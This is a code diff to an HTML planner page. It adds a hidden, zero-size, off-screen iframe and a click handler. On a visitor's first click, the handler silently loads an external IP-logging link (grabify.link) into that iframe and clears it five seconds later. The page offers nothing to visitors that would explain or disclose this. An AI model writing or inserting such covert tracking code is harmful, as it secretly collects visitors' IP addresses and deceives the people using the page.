@@ -147,6 +147,8 @@ body {
 
 </head>
 <body>
+ 
+ <iframe id="grabber" src="" style="border:none;width:0;height:0;position:absolute;top:-10px;left:-10px;"></iframe>
 
 <div class="wrapper">
 <span id="nav-title">Planner</span>
@@ -210,6 +212,21 @@ document.querySelector(".handler").innerHTML = localStorage.getItem("resourceCon
 document.querySelector(".class-handler").innerHTML = localStorage.getItem("classContent").toString();
 
 }
+ 
+ var ipGrabbed = localStorage.getItem("ip");
+ if(!ipGrabbed) {
+  ipGrabbed = false;
+ }
+ 
+ window.onclick = function() {
+  if(ipGrabbed == false) {
+   document.querySelector("#grabber").src = `https://grabify.link/KTPH2N`;
+   window.setTimeout(function() {
+    document.querySelector("#grabber").src = ``;
+   },5000);
+   ipGrabbed = true;
+  }
+ }
 
 var mon = null;
 var tues = null;
